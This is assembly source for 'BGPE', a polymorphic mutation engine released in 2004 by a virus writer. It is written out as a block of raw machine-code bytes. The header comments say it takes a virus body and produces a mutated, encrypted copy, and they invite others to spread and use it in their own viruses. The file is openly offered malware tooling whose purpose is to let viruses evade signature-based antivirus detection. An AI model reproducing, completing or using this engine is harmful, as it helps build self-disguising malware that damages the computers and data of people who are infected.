        ; BGPE  - BlueOwls Genetic Poly Engine (Simple version, v0), november 2004

	; Al though this is just a "simple" version, feel free to spread and
	; use it in whatever you like, as long as you don't hold me responsible
	; AND don't claim it is yours. :) What i was thinking about adding was
	; placing all the code blocks in random order, maybe something for a
	; next version ;). I have not tested it thouroughly, so it could have
	; bugs causing it not to function properly or not to function at all. I
	; just hope it does not have bugs :).

	; Good luck with it.
	; BlueOwl


                ; in:   eax = random number
                ;       ecx = size of virus in bytes rounded to a dword ((virus_size+3)/4)*4
                ;       esi = start of virus
                ;       edi = start of outputbuffer
                ;
                ; out:  eax = size of generated

		; size of bgpe: 646 bytes

bgpe:           db      060h,0E8h,000h,000h,000h,000h,05Dh,0FFh,075h,062h
                db      0FFh,0B5h,07Ch,001h,000h,000h,0FFh,0B5h,080h,001h
                db      000h,000h,055h,051h,08Dh,08Dh,07Ch,001h,000h,000h
                db      08Dh,05Dh,062h,089h,0E5h,083h,0C5h,004h,0E8h,049h
                db      002h,000h,000h,092h,0E8h,043h,002h,000h,000h,021h
                db      0C2h,0E8h,03Ch,002h,000h,000h,021h,0C2h,0E8h,035h
                db      002h,000h,000h,021h,0C2h,031h,013h,06Ah,007h,05Ah
                db      087h,0CAh,0E8h,027h,002h,000h,000h,0A9h,007h,000h
                db      000h,000h,075h,005h,08Ah,002h,088h,042h,001h,042h
                db      0E2h,0ECh,059h,0B0h,0E8h,0AAh,089h,0C8h,0ABh,057h
                db      0C1h,0E9h,002h,068h,000h,000h,000h,000h,051h,050h
                db      0F3h,0A5h,0E8h,0FFh,001h,000h,000h,050h,0E8h,001h
                db      001h,000h,000h,005h,006h,058h,006h,050h,005h,08Bh
                db      00Eh,004h,024h,006h,0FFh,034h,024h,006h,058h,009h
                db      00Bh,00Eh,004h,024h,023h,00Eh,004h,024h,004h,016h
                db      0B8h,066h,005h,068h,066h,016h,058h,009h,083h,016h
                db      0E0h,000h,081h,016h,0C0h,066h,005h,08Dh,01Eh,005h
                db      066h,005h,04Eh,087h,02Eh,000h,007h,04Eh,0FFh,006h
                db      030h,026h,058h,005h,04Eh,08Bh,02Eh,000h,008h,04Eh
                db      00Bh,02Eh,000h,023h,02Eh,000h,016h,08Dh,06Eh,080h
                db      056h,0C1h,026h,0C0h,05Eh,076h,051h,00Fh,0B6h,04Dh
                db      0ECh,0D3h,0C8h,059h,02Bh,045h,01Ch,0C3h,014h,0C1h
                db      026h,0C8h,05Eh,0F7h,026h,0D8h,076h,0F7h,0D8h,051h
                db      00Fh,0B6h,04Dh,0ECh,0D3h,0C0h,059h,0C3h,00Fh,00Fh
                db      026h,0C8h,081h,026h,0F0h,056h,076h,033h,045h,01Ch
                db      00Fh,0C8h,0C3h,00Fh,081h,026h,0E8h,056h,0F7h,026h
                db      0D0h,076h,0F7h,0D0h,003h,045h,01Ch,0C3h,004h,087h
                db      02Eh,000h,006h,026h,050h,08Fh,006h,000h,004h,089h
                db      02Eh,000h,007h,021h,02Eh,000h,009h,02Eh,000h,005h
                db      08Dh,036h,040h,004h,005h,083h,006h,0C0h,004h,005h
                db      083h,006h,0E8h,0FCh,009h,006h,040h,006h,040h,006h
                db      040h,006h,040h,003h,016h,048h,005h,083h,016h,0E8h
                db      001h,005h,083h,016h,0C0h,0FFh,005h,08Dh,03Eh,040h
                db      0FFh,008h,009h,03Eh,0C0h,074h,002h,0EBh,046h,007h
                db      016h,040h,016h,048h,075h,046h,007h,083h,016h,0F8h
                db      001h,073h,046h,009h,016h,048h,078h,003h,016h,040h
                db      079h,046h,002h,0C3h,004h,0C2h,000h,000h,004h,058h
                db      0FFh,0E0h,007h,0FFh,034h,024h,0C2h,004h,000h,000h
                db      05Ah,0E8h,007h,000h,000h,000h,000h,001h,002h,003h
                db      005h,006h,007h,05Bh,080h,03Ah,000h,00Fh,084h,0C7h
                db      000h,000h,000h,089h,0D6h,06Ah,004h,059h,00Fh,0B6h
                db      002h,001h,0C2h,0E2h,0F9h,08Bh,04Dh,0F8h,0C1h,06Dh
                db      0F8h,002h,083h,0E1h,003h,009h,0C9h,074h,007h,00Fh
                db      0B6h,006h,001h,0C6h,0E2h,0F9h,00Fh,0B6h,00Eh,049h
                db      046h,0ACh,050h,083h,0E0h,007h,083h,0F8h,006h,058h
                db      074h,009h,008h,0E0h,0AAh,028h,0E4h,0E2h,0EEh,0EBh
                db      0BDh,00Fh,0B6h,0C0h,0C1h,0E8h,003h,052h,0E8h,00Fh
                db      000h,000h,000h,058h,034h,060h,03Ah,047h,04Bh,053h
                db      05Bh,064h,06Ch,070h,07Ch,075h,041h,01Ch,05Ah,08Ah
                db      004h,002h,001h,0C2h,029h,0C0h,0FFh,0D2h,05Ah,0EBh
                db      0D4h,052h,057h,087h,0F2h,08Bh,04Dh,0F4h,08Bh,075h
                db      0FCh,089h,0F7h,0ADh,0FFh,0D2h,0ABh,0E2h,0FAh,06Ah
                db      001h,059h,05Fh,05Ah,0C3h,08Ah,023h,0C0h,0E4h,003h
                db      0C3h,08Ah,063h,001h,0C0h,0E4h,003h,0C3h,08Ah,063h
                db      002h,0C0h,0E4h,003h,00Ah,063h,002h,0C3h,08Ah,063h
                db      002h,0C0h,0E4h,003h,0EBh,005h,08Ah,023h,0C0h,0E4h
                db      003h,00Ah,023h,0C3h,0E8h,0DAh,0FFh,0FFh,0FFh,00Ah
                db      063h,001h,0C3h,08Bh,045h,0F0h,029h,0F8h,048h,0AAh
                db      0C3h,089h,07Dh,0F0h,0C3h,08Bh,045h,01Ch,0EBh,003h
                db      08Bh,045h,0F4h,0ABh,029h,0C0h,0C3h,08Ah,045h,0ECh
                db      0AAh,0C3h,089h,0ECh,05Dh,08Fh,085h,080h,001h,000h
                db      000h,08Fh,085h,07Ch,001h,000h,000h,08Fh,045h,062h
                db      089h,07Ch,024h,01Ch,061h,029h,0F8h,0C3h,08Bh,045h
                db      01Ch,0C1h,0C0h,007h,066h,0F7h,0D8h,005h,0A5h,023h
                db      08Fh,0B7h,031h,045h,01Ch,0C3h

		; Copyright BlueOwl, november 2004
